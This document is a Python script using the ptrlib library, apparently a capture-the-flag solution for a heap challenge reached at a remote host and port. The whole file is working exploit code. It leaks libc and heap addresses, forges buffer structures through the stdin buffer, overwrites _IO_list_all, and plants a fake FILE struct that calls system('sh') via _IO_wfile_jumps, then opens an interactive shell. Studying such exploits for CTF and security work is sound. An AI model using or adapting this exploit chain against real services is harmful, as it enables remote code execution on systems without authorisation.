from ptrlib import *
import sys
import time

FILE_NAME = "../challenge/chal"

#HOST = "localhost"
HOST = "34.85.4.172"
PORT = 33336
  
libc = ELF("./libc.so.6")
local_base = 0x7ffff7c00000
off_bins =  0x7ffff7e04240 - local_base

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  sock = Socket(HOST, PORT)
else:
  sock = Process(FILE_NAME)

sock.debug = True

def create(fname, idx):
  sock.sendlineafter(": ", "1")
  sock.sendlineafter(": ", str(idx))
  sock.sendlineafter(": ", fname)

def copy(src, dst, data=b'', offset=0):
  sock.sendlineafter(": ", "2")
  sock.sendlineafter(": ", str(src))
  if offset == 0:
    sock.sendlineafter(": ", str(dst))
  else:
    input_buffer(dst, ": ", data, offset)

def show(idx):
  sock.sendlineafter("command: ", "3")
  sock.sendlineafter("index: ", str(idx))

def input_buffer(cmd, msg, data, offset):
  # fill the stdin buffer
  input_stdin_buf = str(cmd).encode()
  input_stdin_buf += b"\x00"*(offset-len(input_stdin_buf))
  input_stdin_buf += data
  sock.sendafter(msg, input_stdin_buf)

# for stable exploit
LOOP_CNT = 5

def exploit():
  create("/app/run", 0)
  create("/app/run", 1)

  f = b"/proc/self/fd/2"
  create(f, 0) 
  show(0)
  addr_bins = u64(sock.recvline())
  libc_base = addr_bins - off_bins
  libc.base = libc_base
  print("[+]libc_base = 0x%x"%libc_base)
  input("libc leak")

  create(f, 0)  
  show(0)
  heap_base = (u64(sock.recvline())<<12)-0x2000
  
  addr_stdin_buf = heap_base+0x2a0
  size_stdin_buf = 0x1000
  addr_end_stdin_buf = addr_stdin_buf + size_stdin_buf

  print("[+]heap_base = 0x%x"%heap_base)
  input("heap leak")

  f_0x1e0 = '/usr/lib/x86_64-linux-gnu/perl-base/IO.pm' # some file with size around 0x1e0
  create(f_0x1e0, 0)
  create(f_0x1e0, 0)               # to allocate 0x1e0 chunk below stdin buffer as a buf_ptr(not as a FILE struct)

  create(f, 1)
  create(f, 2)
  
  fake_struct_buf = b""
  fake_struct_buf += p64(0xffffffffffffffff)   # buffer.size
  fake_struct_buf += p64(heap_base+0x1510)     # buffer.buf_ptr

  # loop for stable
  for i in range(LOOP_CNT):
    print("[-]try 1-%d times"%(i+1))
    time.sleep(0.5)
    input_buffer(0, "command: ", fake_struct_buf, size_stdin_buf-0x10)

  copy(0,2) 
  input("[-]overwrite bufs[1]")

  payload = b""
  payload += p64(0x200)                        # buffer.size
  payload += p64(addr_end_stdin_buf-0x200)     # buffer.buf_ptr
  payload += p64(0)+p64(0)
  payload += p64(0x8)                          # buffer.size
  payload += p64(libc.symbol("_IO_list_all"))  # buffer.buf_ptr

  # loop for stable
  for i in range(LOOP_CNT):
    print("[-]try 2-%d times"%(i+1))
    time.sleep(0.5)
    input_buffer(0, "command: ", payload,size_stdin_buf-0x30)
  copy(0,1)
  
  show(2)
  test_assert = u64(sock.recvline())
  
  assert test_assert == libc.symbol("_IO_2_1_stderr_"), "Error: Couldn't overwrite. Try again."
  
  input("[-]overwrite bufs[1], bufs[2]")
  
  payload = b""
  payload += p64(addr_end_stdin_buf-0x400)
  payload += b"\n"
  
  # loop for stable
  for i in range(LOOP_CNT):
    print("[-]try 3-%d times"%(i+1))
    time.sleep(0.5)
    input_buffer(0, "command: ", payload, size_stdin_buf-0x200)
    copy(1, 2, payload, size_stdin_buf-0x200)
  
  input("[-]overwrite _IO_list_all")

  addr_fake_file = addr_end_stdin_buf-0x400

  fake_file = b''
  fake_file += b"0;sh;\x00\x00\x00"
  fake_file += p64(0)
  fake_file += p64(libc.symbol("system"))
  fake_file += p64(0)
  fake_file += p64(0)
  fake_file += b"\x00"*(0x88-len(fake_file))
  fake_file += p64(addr_fake_file-0x18)
  fake_file += b"\x00"*(0xa0-len(fake_file))
  fake_file += p64(addr_fake_file-0x10)
  fake_file += b"\x00"*(0xc0-len(fake_file))
  fake_file += p64(1)
  fake_file += b"\x00"*(0xd0-len(fake_file))
  fake_file += p64(addr_fake_file+0x10-0x68)
  fake_file += p64(libc.symbol("_IO_wfile_jumps"))
  fake_file += b'\n'

  # loop for stable
  for i in range(LOOP_CNT):
    print("[-]try 4-%d times"%(i+1))
    time.sleep(0.5)
    input_buffer(0, "command: ", fake_file, size_stdin_buf-0x400)
  
  input("[-]prepare fake file struct")
  sock.sendlineafter(": ", "4") 
  sock.interactive()

if __name__ == "__main__":
  exploit()  
